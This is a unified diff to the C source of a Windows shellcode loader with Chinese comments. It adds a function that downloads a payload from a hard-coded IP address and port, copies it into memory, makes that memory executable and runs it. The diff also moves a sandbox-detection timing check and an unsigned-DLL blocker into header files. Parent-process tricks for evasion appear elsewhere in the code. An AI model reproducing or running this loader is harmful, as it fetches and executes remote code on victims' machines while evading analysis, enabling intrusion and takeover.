@@ -1,6 +1,5 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <Windows.h>
+#include"bypass.h"
+#include"stage.h"
 #include <tlhelp32.h>
 #include <Psapi.h>
 #pragma comment(lib, "Crypt32.lib")
@@ -13,9 +12,6 @@ unsigned char jmp32bitOffset[] = {
     0xe9                                // jmp <32-bit immediate_offset>
 };
 
-#define htonl(x) ((x&0x000000ff) << 24 | (x&0x0000ff00) << 8 | (x&0x00ff0000) >> 8 | (x&0xff000000) >> 24)
-#define HIDWORD(x)  (*((DWORD*)&(x)+1))
-
 #define	MagicValue			WORD
 
 struct ConfigurationData {
@@ -25,31 +21,6 @@ struct ConfigurationData {
 	MagicValue			wMagic;
 	IMAGE_NT_HEADERS32	mNtHeader;
 };
-
-//阻止非签名的DLL注入
-void ForBD()
-{
-	//系统需要>=win8系统
-	//PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY signature = { 0 };
-	//GetProcessMitigationPolicy((HANDLE)(-1), (PROCESS_MITIGATION_POLICY)ProcessSignaturePolicy, &signature, sizeof(signature));
-	//signature.MicrosoftSignedOnly = 1;
-	//SetProcessMitigationPolicy((PROCESS_MITIGATION_POLICY)ProcessSignaturePolicy, &signature, sizeof(signature));
-}
-
-//检测沙箱
-bool ForSD()
-{
-	int v3;
-	__int64 v4;
-	v3 = GetTickCount64();
-	Sleep(300u);
-	v4 = (int)(-300 - v3 + GetTickCount64());
-	if ((int)((HIDWORD(v4) ^ v4) - HIDWORD(v4)) > 100)
-		return true;
-	else
-		return false;
-
-}
 
 
 //获取当前进程父进程
@@ -262,7 +233,7 @@ DWORD GetModuleBaseAddress(TCHAR* lpszModuleName, DWORD pID) { // Getting module
 }
 
 //解析运行shellcode
-int RunSC(struct ConfigurationData* config)
+int RunSCFromPE(struct ConfigurationData* config)
 {
 	//获取当前进程加载基址
 	char	fileName[100] = { 0 };
@@ -326,9 +297,27 @@ int RunSC(struct ConfigurationData* config)
 	return 0;
 }
 
+//解析运行shellcode
+int RunSCFromNet(struct ConfigurationData* config)
+{
+	GetStageless("http://118.195.199.66:8181/YrGJ", &config->shellcode, &config->shellcodeSize);
+
+	unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (dwBaseAddr)
+	{
+		memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
+		free(config->shellcode);
+		DWORD oldpro = PAGE_READWRITE;
+		if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
+			((void(*)())dwBaseAddr)();
+	}
+	return 0;
+}
+
 int main()
 {
 	ForBD();
+	
 	struct ConfigurationData config;
 	memset(&config, 0, sizeof(struct ConfigurationData));
 
@@ -340,7 +329,7 @@ int main()
 	if (GetPP())
 	{
 		//自身子进程
-		if (RunSC(&config) < 0) {
+		if (RunSCFromPE(&config) < 0) {
 			return 1;
 		}
 	}
@@ -394,7 +383,7 @@ int main()
 			EXTENDED_STARTUPINFO_PRESENT,
 			NULL,
 			NULL,
-			reinterpret_cast<LPSTARTUPINFOA>(&si),
+			(LPSTARTUPINFOA)(&si),
 			&pi
 		);
 		WaitForSingleObject(pi.hProcess, INFINITE);
